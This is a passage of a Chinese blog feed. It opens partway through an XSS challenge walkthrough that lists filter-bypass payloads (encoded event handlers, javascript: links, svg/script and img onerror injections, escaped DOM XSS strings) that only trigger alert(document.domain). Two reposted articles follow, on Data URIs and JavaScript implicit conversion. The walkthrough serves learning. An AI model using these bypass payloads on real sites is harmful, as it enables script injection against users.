早已经被淘汰了，所以这道题目忽略，如果想要这道题目，直接在 f12 中的 <code>console</code> 下输入 <code>alert(document.domain)</code>，就能前往下一题；</p></blockquote><h4 id="相关知识点-5"><a class="markdownIt-Anchor" href="#相关知识点-5"></a> <code>相关知识点</code></h4><blockquote><p>utf-7</p></blockquote><h4 id="payload-5"><a class="markdownIt-Anchor" href="#payload-5"></a> <code>payload</code></h4><blockquote><p>在 f12 中的 <code>console</code> 下输入 <code>alert(document.domain)</code></p></blockquote><h4 id="题目类型-5"><a class="markdownIt-Anchor" href="#题目类型-5"></a> <code>题目类型</code></h4><blockquote><p>utf-7 问题</p></blockquote><h3 id="font-color-navy0x0a-字符编码绕过font"><a class="markdownIt-Anchor" href="#font-color-navy0x0a-字符编码绕过font"></a> <font color="navy">0x0A 字符/编码绕过</font></h3><h4 id="hint-6"><a class="markdownIt-Anchor" href="#hint-6"></a> <code>Hint</code></h4><blockquote><p><font color="white"> s/domain//g;</font></p></blockquote><h4 id="题目分析-6"><a class="markdownIt-Anchor" href="#题目分析-6"></a> <code>题目分析</code></h4><blockquote><p>① 在输入框中输入 <code>&quot; onclick=alert(document.domain)</code> ，并查看源码，得到如下结果：</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"p1"</span> <span class="attr">size</span>=<span class="string">"50"</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">onclick</span>=<span class="string">"alert(document.)"</span>"&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>可以看到浏览器将我们输入的 <code>domain</code> 给过滤掉了，而且在<code>)</code>后面多了一个<code>&quot;</code>，所以在构造的时候还要将它闭合/注释掉；</p><p>② 我们可以通过根据浏览器原理来进行构造:</p><p>        ▪ 根据 <code>HTML实体编码</code>  的原理可以这样构造：<code>&quot; onclick=alert(document.&amp;#x64;&amp;#x6F;&amp;#x6D;&amp;#x61;&amp;#x69;&amp;#x6E;) &quot;</code></p><p>        ▪ 根据 <code>&lt;svg&gt; 和 javascript 编码的原理</code> 还可以这样构造：<code>&quot;&gt;&lt;svg&gt;&lt;script&gt;alert(document.&amp;#x64;&amp;#x6F;&amp;#x6D;&amp;#x61;&amp;#x69;&amp;#x6E;)&lt;/script&gt;&lt;/svg&gt;</code> 和 <code>&quot;&gt;&lt;script&gt;alert(document.\u0064\u006f\u006d\u0061\u0069\u006e)&lt;/script&gt;</code></p></blockquote><h4 id="相关知识点s"><a class="markdownIt-Anchor" href="#相关知识点s"></a> <code>相关知识点s</code></h4><blockquote><ol><li>HTML 编码、JavaScript 编码</li></ol></blockquote><h4 id="payload-6"><a class="markdownIt-Anchor" href="#payload-6"></a> <code>payload</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload1:" onclick=alert(document.&amp;#x64;&amp;#x6F;&amp;#x6D;&amp;#x61;&amp;#x69;&amp;#x6E;) "</span><br><span class="line">pauload2:"&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(document.&amp;#x64;&amp;#x6F;&amp;#x6D;&amp;#x61;&amp;#x69;&amp;#x6E;)"</span>&gt;</span>/xss/<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">payload3:"&gt;<span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(document.&amp;#x64;&amp;#x6F;&amp;#x6D;&amp;#x61;&amp;#x69;&amp;#x6E;)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">payload4:"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.\u0064\u006f\u006d\u0061\u0069\u006e)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">payload5:"&gt;<span class="tag">&lt;<span class="name">script</span>/<span class="attr">src</span>=<span class="string">http://locahost/payload.js</span>&gt;</span>"<span class="tag">&lt;/<span class="name">script</span>&gt;</span> // payload.js 文件里面的内容为：alert(document.\u0064\u006f\u006d\u0061\u0069\u006e)</span><br><span class="line">payload6:"&gt;<span class="tag">&lt;<span class="name">img</span>/<span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">alert(document.&amp;#x64;&amp;#x6F;&amp;#x6D;&amp;#x61;&amp;#x69;&amp;#x6E;)</span>&gt;</span></span><br><span class="line">payload7:" onclick=alert(document.domdomainain);</span><br></pre></td></tr></table></figure><h4 id="题目类型-6"><a class="markdownIt-Anchor" href="#题目类型-6"></a> <code>题目类型</code></h4><blockquote><p>编码绕过以及字符绕过</p></blockquote><h3 id="font-color-navy0x0b-伪协议font"><a class="markdownIt-Anchor" href="#font-color-navy0x0b-伪协议font"></a> <font color="navy">0x0B 伪协议</font></h3><h4 id="hint-7"><a class="markdownIt-Anchor" href="#hint-7"></a> <code>Hint</code></h4><blockquote><p><font color="white">“s/script/xscript/ig;” and “s/on[a-z]+=/onxxx=/ig;” and “s/style=/stxxx=/ig;”</font></p></blockquote><h4 id="题目分析-7"><a class="markdownIt-Anchor" href="#题目分析-7"></a> <code>题目分析</code></h4><blockquote><p>① 初尝试：将 <code>onclick = alert(document.domain)&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</code> 输入框中，打开源码得到如下的结果：</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"p1"</span> <span class="attr">size</span>=<span class="string">"50"</span> <span class="attr">value</span>=<span class="string">"onxxx= alert(document.domain)"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xscript</span>&gt;</span>alert(document.domain)<span class="tag">&lt;/<span class="name">xscript</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>从上面的结果可以看出，浏览器将我们输的 <code>script</code> 变为了 <code>xscript</code>，将 <code>on+event=</code> 变成了 <code>onxxx=</code>，所以构造失败。</p><p>② 绕过：既然有过滤的作用，那么我们是不是可以通过编码绕过呢？<code>script</code> 作为标签的话无法进行编码绕过，否则就会被解码为普通字符串（HTML 解码）或者不能解码（unicode 编码），那么就要想出来一个既能被解码为 <code>script</code> 又能执行 <code>alert(document.domain)</code> 函数的 <code>javascript</code> 的入口，想来想去有一个可以这样做的 <code>javascript:</code> 伪协议，如果用 <code>HTML 实体编码</code> 进行编码的话，浏览器会正常解码，并且 <code>url 编码</code> 也能正常找到地址入口，所以可以的。</p><p>③ 构造 payload：这道题目的 payload 其实和上一道题目的 payload2 相似，只不过是编码的位置不同；</p></blockquote><h4 id="相关知识点-6"><a class="markdownIt-Anchor" href="#相关知识点-6"></a> <code>相关知识点</code></h4><blockquote><ol><li>伪协议的相关知识</li></ol></blockquote><h4 id="payload-7"><a class="markdownIt-Anchor" href="#payload-7"></a> <code>payload</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:"&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(document.domain)"</span>&gt;</span>/xss/<span class="tag">&lt;/&gt;</span></span><br></pre></td></tr></table></figure><h4 id="题目类型-7"><a class="markdownIt-Anchor" href="#题目类型-7"></a> <code>题目类型</code></h4><blockquote><p>实体编码绕过</p></blockquote><h3 id="font-color-navy0x0c-反引号的特性font"><a class="markdownIt-Anchor" href="#font-color-navy0x0c-反引号的特性font"></a> <font color="navy">0x0C 反引号的特性</font></h3><h4 id="hint-8"><a class="markdownIt-Anchor" href="#hint-8"></a> <code>Hint</code></h4><blockquote><p><font color="white">“s/[\x00-\x20\&lt;\&gt;\”\’]//g;&quot;</font></p></blockquote><h4 id="题目分析-8"><a class="markdownIt-Anchor" href="#题目分析-8"></a> <code>题目分析</code></h4><blockquote><p>① 同样先输入一些字符串进行试探以下 <code>&quot; onclick=alert(1)&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;/xss/&lt;/a&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>  得到的源码如下：</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"p1"</span> <span class="attr">size</span>=<span class="string">"50"</span></span></span><br><span class="line"><span class="tag"><span class="attr">value</span>=<span class="string">"onclick=alert(1)ahref=javascript:alert(1)/xss//ascriptalert(1)/script"</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>可以看出来，浏览器将我们输入字符串中的 <code>&quot;</code> 、<code>'</code>、<code>&lt;</code> 和 <code>&gt;</code> 进行过滤掉了，所以我们要换一个思路逃逸 <code>&quot;</code> 的束缚；</p></blockquote><h4 id="相关知识点-7"><a class="markdownIt-Anchor" href="#相关知识点-7"></a> <code>相关知识点</code></h4><blockquote><ol><li>反引号的特性：<ol><li>如果 <code>(</code> 和 <code>)</code> 被过滤掉，那么就可以用 `` 来代替，同样能够被成功执行；</li><li>如果 <code>&quot;</code> 和 <code>'</code> 被过滤掉，那么在 <code>IE</code> 浏览器下也可以用反引号 ` 来代替；</li></ol></li></ol></blockquote><h4 id="payload-8"><a class="markdownIt-Anchor" href="#payload-8"></a> <code>payload</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:`` onclick=alert(document.domain)   <span class="comment">&lt;!-- 须在 IE 浏览器下执行 --&gt;</span></span><br></pre></td></tr></table></figure><h4 id="题目类型-8"><a class="markdownIt-Anchor" href="#题目类型-8"></a> <code>题目类型</code></h4><blockquote><p>逃离 <code>&quot;</code> 的束缚</p></blockquote><h3 id="font-color-navy0x0d-css1font"><a class="markdownIt-Anchor" href="#font-color-navy0x0d-css1font"></a> <font color="navy">0x0D css1</font></h3><h4 id="hint-9"><a class="markdownIt-Anchor" href="#hint-9"></a> <code>Hint</code></h4><blockquote><p><code>style attribute</code></p></blockquote><h4 id="题目分析-9"><a class="markdownIt-Anchor" href="#题目分析-9"></a> <code>题目分析</code></h4><blockquote><p>① 这是一道利用 <code>css</code>  进行 xss 的题目，需要用到 css <code>expression</code> ，这道题暂时不做</p></blockquote><h4 id="相关知识点-8"><a class="markdownIt-Anchor" href="#相关知识点-8"></a> <code>相关知识点</code></h4><blockquote><ol><li>css 的 payload（需要整理）</li></ol></blockquote><h4 id="payload-9"><a class="markdownIt-Anchor" href="#payload-9"></a> <code>payload</code></h4><h4 id="题目类型-9"><a class="markdownIt-Anchor" href="#题目类型-9"></a> <code>题目类型</code></h4><h3 id="font-color-navy0x0e-css2font"><a class="markdownIt-Anchor" href="#font-color-navy0x0e-css2font"></a> <font color="navy">0x0E css2</font></h3><h4 id="hint-10"><a class="markdownIt-Anchor" href="#hint-10"></a> <code>Hint</code></h4><blockquote><p><code>s/(url|script|eval|expression)/xxx/ig;</code></p></blockquote><h4 id="题目分析-10"><a class="markdownIt-Anchor" href="#题目分析-10"></a> <code>题目分析</code></h4><blockquote><p>这也是一道 css 的题目，后面再做</p></blockquote><h4 id="相关知识点-9"><a class="markdownIt-Anchor" href="#相关知识点-9"></a> <code>相关知识点</code></h4><h4 id="payload-10"><a class="markdownIt-Anchor" href="#payload-10"></a> <code>payload</code></h4><h4 id="题目类型-10"><a class="markdownIt-Anchor" href="#题目类型-10"></a> <code>题目类型</code></h4><h3 id="font-color-navy0x0f-dom-xssfont"><a class="markdownIt-Anchor" href="#font-color-navy0x0f-dom-xssfont"></a> <font color="navy">0x0F DOM xss</font></h3><h4 id="hint-11"><a class="markdownIt-Anchor" href="#hint-11"></a> <code>Hint</code></h4><blockquote><p><font color="white">document.write();</font></p></blockquote><h4 id="题目分析-11"><a class="markdownIt-Anchor" href="#题目分析-11"></a> <code>题目分析</code></h4><blockquote><p>① 先输入<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code> ，看一下 value 值处有没有 xss 可以利用的漏洞，发现很难逃离双引号的束缚，于是看一下有没有别的地方有可以利用的地方，发现可以利用 <code>document.write</code> 的输出进行构造，但是这个函数因为是在js范畴，<code>document.write</code> 在输出的时候会 <code>JavascriptDecode</code>一下数据，会把数据原有 <code>\</code> 去除。</p></blockquote><h4 id="相关知识点-10"><a class="markdownIt-Anchor" href="#相关知识点-10"></a> <code>相关知识点</code></h4><blockquote><ol><li><code>document.write</code> 的相关知识点：<ol><li>document.write知多少：<a href="https://segmentfault.com/a/1190000006197157" target="_blank" rel="noopener">https://segmentfault.com/a/1190000006197157</a></li></ol></li></ol></blockquote><h4 id="payload-11"><a class="markdownIt-Anchor" href="#payload-11"></a> <code>payload</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:\\x3csvg\\x2fonload=alert(document.domain)\\x3e</span><br></pre></td></tr></table></figure><h4 id="题目类型-11"><a class="markdownIt-Anchor" href="#题目类型-11"></a> <code>题目类型</code></h4><blockquote><p>DOM xss</p></blockquote><h3 id="font-color-navy0x10-documentwritefont"><a class="markdownIt-Anchor" href="#font-color-navy0x10-documentwritefont"></a> <font color="navy">0x10 document.write()</font></h3><h4 id="hint-12"><a class="markdownIt-Anchor" href="#hint-12"></a> <code>Hint</code></h4><blockquote><p><font color="white"> “document.write();” and “s/\\x/\\\x/ig;”</font></p></blockquote><h4 id="题目分析-12"><a class="markdownIt-Anchor" href="#题目分析-12"></a> <code>题目分析</code></h4><blockquote><p>和上一道题目一样，但是不同的是将 <code>\x</code> 变为了<code>\\x</code> 所以上一道题目的 payload 就无法被执行了，但是我们知道 javascript 编码的格式</p></blockquote><h4 id="相关知识点-11"><a class="markdownIt-Anchor" href="#相关知识点-11"></a> <code>相关知识点</code></h4><blockquote><ol><li><p>document.write 的相关知识点</p></li><li><p>javascript 可以解析的编码形式：</p></li></ol></blockquote><table><thead><tr><th style="text-align:center">进制</th><th style="text-align:center">格式</th><th style="text-align:center">举例</th></tr></thead><tbody><tr><td style="text-align:center">ascii(默认)</td><td style="text-align:center">无</td><td style="text-align:center">&gt;(62)</td></tr><tr><td style="text-align:center">八进制</td><td style="text-align:center">\0（三位，不足补 0 ）</td><td style="text-align:center">\074</td></tr><tr><td style="text-align:center">十六进制</td><td style="text-align:center">\x00</td><td style="text-align:center">\x3</td></tr><tr><td style="text-align:center">unicode 编码</td><td style="text-align:center">\u00</td><td style="text-align:center">\u003c</td></tr></tbody></table><h4 id="payload-12"><a class="markdownIt-Anchor" href="#payload-12"></a> <code>payload</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:\\u003csvg\\u002fonload=alert(document.domain)\\u003e</span><br></pre></td></tr></table></figure><h4 id="题目类型-12"><a class="markdownIt-Anchor" href="#题目类型-12"></a> <code>题目类型</code></h4><h3 id="font-color-brown0x11-0x12-skippedfont"><a class="markdownIt-Anchor" href="#font-color-brown0x11-0x12-skippedfont"></a> <font color="brown">0x11- 0x12 skipped</font></h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x05-length-limited-textfont&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x05-length-limited-textfont&quot;&gt;&lt;/a&gt; &lt;
      
    
    </summary>
    
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
      <category term="xss" scheme="https://muzibing.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>【转载】Data URI 知识点详解</title>
    <link href="https://muzibing.github.io/2020/03/04/2020.03.04%EF%BC%8898%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/03/04/2020.03.04（98）/</id>
    <published>2020-03-03T16:00:00.000Z</published>
    <updated>2020-03-04T07:32:34.347Z</updated>
    
    <content type="html"><![CDATA[<h3 id="data-uri"><a class="markdownIt-Anchor" href="#data-uri"></a> Data URI</h3><p>Data URI是由RFC 2397定义的一种把小文件直接嵌入文档的方案。格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:[&lt;MIME type&gt;][;charset=&lt;charset&gt;][;base64],&lt;encoded data&gt;</span><br></pre></td></tr></table></figure><p>其实整体可以视为三部分，即<code>声明：参数+数据，逗号左边的是各种参数，右边的是数据</code>。</p><p>声明：data:是URI的协议头，表明其资源是一个data URI；</p><p>参数：MIME type，表示数据呈现的格式，即指定嵌入数据的MIME。对于PNG的图片，其格式是：image/png，如果没有指定，默认是：text/plain；character set(字符集）大多数被忽略，默认是：charset=US-ASCII。如果指定是的数据格式是图片时，字符集将不再使用；base64，这一部分将表明其数据的编码方式，此处为声明后面的数据的编码是base64，我们可以不必使用base64编码格式，如果那样，我们将使用标准的URL编码方式（形如%XX%XX%XX的格式）；</p><p>数据：这个encoded data部分为实际的数据，可能包含空格，但是无关紧要。</p><p><strong>优点和缺点</strong></p><p>这两点相信大家都看眼烦了，那就把我认为重要的say下喽。</p><p>优点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">减少HTTP请求数</span><br><span class="line">避免了图片重新上传，清理缓存的问题</span><br><span class="line">运用在模版环境中时，省去了拷贝图片的步骤</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>缺点：<br>1.无法重复利用。img虽然是一个请求数，但是加载完后，如果还有N次引用，那还1，而DataURI却必须是N次了；<br>2.图片等资源转换为DataURI所用的Base64编码之后，文件大小增加了好多（通常50%-300%），想想下，如果服务器端不做Gzip压缩的话，那不是要……，压缩后倒是跟原本的差不多大小；<br>3.加载、解码后渲染，消耗内存和CPU，手机上还得耗电池呢啊；<br>4.浏览器限制；<br>5.这个也是最可气的，那么一大长串编码无疑是对自己优雅代码的一个摧残啊，有代码洁癖的你能忍么？<br>6.……</p><p><strong>如何获得图片的base64编码</strong></p><p>在网上搜了几个在线的图片转义为base64的，缺发现没几个好用的，而且记不住网址，下面推荐一个，<a href="http://www.pjhome.net/web/html5/encodeDataUrl.htm" target="_blank" rel="noopener">http://www.pjhome.net/web/htm…</a>（原版的），最初见到的是在飘飘那里：<a href="http://labs.pufen.net/my_collection/datauri.htm" target="_blank" rel="noopener">http://labs.pufen.net/my_coll…</a>。</p><p>当然，这么好的东西自己也必须要收藏一份儿了啊，格桑的博客的地址<a href="http://aiyouu.net/tools/datauri.html" target="_blank" rel="noopener">http://aiyouu.net/tools/datau…</a>，用的时候方便啊，有空了再改造下。</p><p>哦，忘了说怎么用了，直接把图片拖到页面里面就可以了。</p><p><strong>手机端DataURI比外链资源慢6倍</strong></p><p>好久之前（那时候我还在上学）鬼哥写过DataURI会多消耗53%左右的CPU资源，内存多出4倍左右，耗时平均高出24.6倍，那手机上呢？</p><p>mobify最新的测试数据：DataURI要比简单的外链资源要慢6倍。</p><p><img src="/images/98-1.jpg" alt></p><p>详情点击访问：<a href="http://www.mobify.com/blog/data-uris-are-slow-on-mobile/" target="_blank" rel="noopener">mobify</a></p><p><strong>使用建议</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sprite能用还得用啊，DataURI的方法要慎用，对于Webapp，还是研究各种缓存技术；</span><br><span class="line">个别不能sprite且质量小的图片可以用DataURI</span><br><span class="line">对个别BT需求时可以用来做为替代img的方案</span><br><span class="line">……（期待你来补充的哦）</span><br></pre></td></tr></table></figure><p><strong>最后：URI，不是URL</strong></p><p>如果不仔细看，真的会误把data URI看成data URL，然后用URL的方式去理解URI，其实不然！</p><p>URL是uniform resource locator的缩写，在web中的每一个可访问资源都有一个URL地址，例如图片，HTML文件，js文件以及style sheet文件，我们可以通过这个地址去download这个资源。</p><p>其实URL是URI的子集，URI是uniform resource identifier的缩写。URI是用于获取资源，包括其附加的信息的一种协议。附加信息可能是地址，也可能不是地址，如果是地址，那么这时URI就变成URL了。注意的是data URI不是URL，因为它并不包含资源的公共地址。</p><p>文章转载于<a href="http://aiyouu.net/data-uris-explained/" target="_blank" rel="noopener">http://aiyouu.net/data-uris-e…</a></p><p><strong>参考扩展阅读：</strong><br>1.<a href="http://www.cnblogs.com/hongru/archive/2012/01/14/2321397.html" target="_blank" rel="noopener">关于base64编码的原理及实现</a>（表示迷糊）<br>2.<a href="http://css-tricks.com/data-uris/" target="_blank" rel="noopener">Data URIs</a><br>3.<a href="http://www.99css.com/archives/492" target="_blank" rel="noopener">Data URI&amp;MHTML: 用还是不用？</a><br>4.<a href="http://www.cssforest.org/blog/index.php?id=152" target="_blank" rel="noopener">Data URI的利弊</a><br>5.<a href="http://www.qianduan.net/data-uris-are-slow-on-mobile.html" target="_blank" rel="noopener">手机端DataURI比外链资源慢6倍</a><br>6.译文：<a href="http://www.douban.com/group/topic/36419540/" target="_blank" rel="noopener">data URI，不是URL啊</a><br>7.原文：<a href="http://www.nczonline.net/blog/2009/10/27/data-uris-explained/" target="_blank" rel="noopener">Data URIs explained</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;data-uri&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#data-uri&quot;&gt;&lt;/a&gt; Data URI&lt;/h3&gt;
&lt;p&gt;Data URI是由RFC 2397定义的一种把小文件直接嵌入文档的方案。格式如下：&lt;/p&gt;
&lt;figure
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>【转载】JavaScript 的隐式转换</title>
    <link href="https://muzibing.github.io/2020/03/04/2020.03.04%EF%BC%8897%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/03/04/2020.03.04（97）/</id>
    <published>2020-03-03T16:00:00.000Z</published>
    <updated>2020-03-04T04:09:37.835Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>作者：keenjaan<br>链接：<a href="https://juejin.im/post/5a7172d9f265da3e3245cbca" target="_blank" rel="noopener">https://juejin.im/post/5a7172d9f265da3e3245cbca</a><br>来源：掘金</p></blockquote><p>你有没有在面试中遇到特别奇葩的js隐形转换的面试题，第一反应是怎么会是这样呢？难以自信，js到底是怎么去计算得到结果，你是否有深入去了解其原理呢？下面将深入讲解其实现原理。</p><p>其实这篇文章初稿三个月前就写好了，在我读一些源码库时，遇到了这些基础知识，想归档整理下，就有了这篇文章。由于一直忙没时间整理，最近看到了这个比较热的题，决定把这篇文章整理下。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> a = &#123;</span><br><span class="line">  i: <span class="number">1</span>,</span><br><span class="line">  toString: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.i++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (a == <span class="number">1</span> &amp;&amp; a == <span class="number">2</span> &amp;&amp; a == <span class="number">3</span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'hello world!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>网上给出了很多不错的解析过程，读了下面内容，你将更深入的了解其执行过程。</p><h3 id="1-js数据类型"><a class="markdownIt-Anchor" href="#1-js数据类型"></a> 1、js数据类型</h3><p>js中有7种数据类型，可以分为两类：原始类型、对象类型：</p><p>基础类型(原始值)：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Undefined、 Null、 <span class="built_in">String</span>、 <span class="built_in">Number</span>、 <span class="built_in">Boolean</span>、 <span class="built_in">Symbol</span> (es6新出的，本文不讨论这种类型)</span><br></pre></td></tr></table></figure><p>复杂类型(对象值)：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object</span><br></pre></td></tr></table></figure><h3 id="2-三种隐式转换类型"><a class="markdownIt-Anchor" href="#2-三种隐式转换类型"></a> 2、三种隐式转换类型</h3><p>js中一个难点就是js隐形转换，因为js在一些操作符下其类型会做一些变化，所以js灵活，同时造成易出错，并且难以理解。</p><p>涉及隐式转换最多的两个运算符 + 和 ==。</p><p>+运算符即可数字相加，也可以字符串相加。所以转换时很麻烦。== 不同于===，故也存在隐式转换。- * / 这些运算符只会针对number类型，故转换的结果只能是转换成number类型。</p><p>既然要隐式转换，那到底怎么转换呢，应该有一套转换规则，才能追踪最终转换成什么了。</p><p>隐式转换中主要涉及到三种转换：</p><blockquote><p>1、将值转为原始值，ToPrimitive()</p><p>2、将值转为数字，ToNumber()</p><p>3、将值转为字符串，ToString()。</p></blockquote><h4 id="21-通过toprimitive将值转换为原始值"><a class="markdownIt-Anchor" href="#21-通过toprimitive将值转换为原始值"></a> 2.1、通过ToPrimitive将值转换为原始值</h4><p>js引擎内部的抽象操作ToPrimitive有着这样的签名：</p><p>ToPrimitive(input, PreferredType?)</p><p>input是要转换的值，PreferredType是可选参数，可以是Number或String类型。他只是一个转换标志，转化后的结果并不一定是这个参数所值的类型，但是转换结果一定是一个原始值（或者报错）。</p><h5 id="211-如果preferredtype被标记为number则会进行下面的操作流程来转换输入的值"><a class="markdownIt-Anchor" href="#211-如果preferredtype被标记为number则会进行下面的操作流程来转换输入的值"></a> 2.1.1、如果PreferredType被标记为Number，则会进行下面的操作流程来转换输入的值。</h5><blockquote><p>1、如果输入的值已经是一个原始值，则直接返回它<br>2、否则，如果输入的值是一个对象，则调用该对象的valueOf()方法，<br>如果valueOf()方法的返回值是一个原始值，则返回这个原始值。<br>3、否则，调用这个对象的toString()方法，如果toString()方法返回的是一个原始值，则返回这个原始值。<br>4、否则，抛出TypeError异常。</p></blockquote><h5 id="212-如果preferredtype被标记为string则会进行下面的操作流程来转换输入的值"><a class="markdownIt-Anchor" href="#212-如果preferredtype被标记为string则会进行下面的操作流程来转换输入的值"></a> 2.1.2、如果PreferredType被标记为String，则会进行下面的操作流程来转换输入的值。</h5><blockquote><p>1、如果输入的值已经是一个原始值，则直接返回它<br>2、否则，调用这个对象的toString()方法，如果toString()方法返回的是一个原始值，则返回这个原始值。<br>3、否则，如果输入的值是一个对象，则调用该对象的valueOf()方法，<br>如果valueOf()方法的返回值是一个原始值，则返回这个原始值。<br>4、否则，抛出TypeError异常。</p></blockquote><p>既然PreferredType是可选参数，那么如果没有这个参数时，怎么转换呢？PreferredType的值会按照这样的规则来自动设置：</p><blockquote><p>1、该对象为Date类型，则PreferredType被设置为String<br>2、否则，PreferredType被设置为Number</p></blockquote><h5 id="213-valueof方法和tostring方法解析"><a class="markdownIt-Anchor" href="#213-valueof方法和tostring方法解析"></a> 2.1.3、valueOf方法和toString方法解析</h5><p>上面主要提及到了valueOf方法和toString方法，那这两个方法在对象里是否一定存在呢？答案是肯定的。在控制台输出Object.prototype，你会发现其中就有valueOf和toString方法，而Object.prototype是所有对象原型链顶层原型，所有对象都会继承该原型的方法，故任何对象都会有valueOf和toString方法。</p><p>先看看对象的valueOf函数，其转换结果是什么？对于js的常见内置对象：<code>Date, Array, Math, Number, Boolean, String, Array, RegExp, Function</code>。</p><p>1、Number、Boolean、String这三种构造函数生成的基础值的对象形式，通过valueOf转换后会变成相应的原始值。如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="keyword">new</span> <span class="built_in">Number</span>(<span class="string">'123'</span>);</span><br><span class="line">num.valueOf(); <span class="comment">// 123</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str = <span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">'12df'</span>);</span><br><span class="line">str.valueOf(); <span class="comment">// '12df'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bool = <span class="keyword">new</span> <span class="built_in">Boolean</span>(<span class="string">'fd'</span>);</span><br><span class="line">bool.valueOf(); <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>2、Date这种特殊的对象，其原型Date.prototype上内置的valueOf函数将日期转换为日期的毫秒的形式的数值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 